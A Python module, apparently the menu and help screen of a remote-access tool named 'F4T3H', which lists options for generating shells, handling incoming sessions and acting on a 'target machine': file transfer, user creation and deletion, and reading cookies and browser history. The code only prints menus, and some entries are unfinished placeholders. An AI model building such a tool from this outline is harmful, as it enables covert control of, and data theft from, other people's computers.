
from termcolor import colored
from os import system

def banner():
    print(colored(f"""\033[1m
     ___ _ _ _____ _____  _   __      ___      ___ ___ 
    | __| | |_   _|__ / || |__\ \    / (_)_ _ / __|_  )
    | _||_  _|| |  |_ \ __ |___\ \/\/ /| | ' \ (__ / / By:{colored("0xGhazy", "red")}\033[93m\033[1m
    |_|   |_| |_| |___/_||_|    \_/\_/ |_|_||_\___/___|\n
    > Script Options:        > Description
    -----------------        -------------
    [1] new                  - Generating a new Shell.
    [2] ls-conn              - List all incoming connections/sessions.
    [3] listening            - Starting shell session.
    [4] help                 - Help man.
    [0] exit                 - Exit this awesome tool :(\n""", "yellow"))




def print_usage(statement):
    print(colored(f"{statement}\n", "blue"))


def send_usage():
    s = """
    send <FILE_URL>
    you can get this link by using uploadServer.py
    Example: \033[1msend http://127.0.0.1:8080/myPhoto.jpg
    """
    print_usage(s)


def get_usage():
    print_usage("""


    """)





def help_man():
    print(f"""\033[1m
        __  __     __            __  ___          
       / / / /__  / /___        /  |/  /___ _____ 
      / /_/ / _ \/ / __ \______/ /|_/ / __ `/ __ \\
     / __  /  __/ / /_/ /_____/ /  / / /_/ / / / /
    /_/ /_/\___/_/ .___/     /_/  /_/\__,_/_/ /_/ 
                /_/\n
    Usage: {colored("help <option name>", "yellow")}

    F4T3H Shell Options
    ===================
    send                      - Sending binary files from your 'SENDING_PATH' dir to target machine.
    get                       - Downloading binary files from the target machine.
    exsent                    - Sending binary files from external resource to target machine.

    port-scan                 - Scanning ip address for opened port numbers.
    geoip                     - Getting information about ip address.
    list-connections          - Display list of all connections.

    system-info               - Display all system's information like 'systeminfo'
    whoami                    - Returning the Currant user and his statue if admin or not.
    add-user                  - Adding a new user to users list.
    del-user                  - Deleting user from users list.

    write                     - commsd65s4d6s4d5s4d645
    delete                    - Deleting files from Directory.
    edit
    rename
    find
    fstmp
    fstate
    run
    calc-SHA1
    calc-SHA224
    calc-SHA256
    calc-SHA384
    calc-MD5

    read-cookies
    read-history
    """)
    while True:
        help_ = "F4T3H({0})> ".format(colored("Help-Manager", "red"))
        help_command = input(help_).lower()


        if help_command == "send":
            send_usage()
            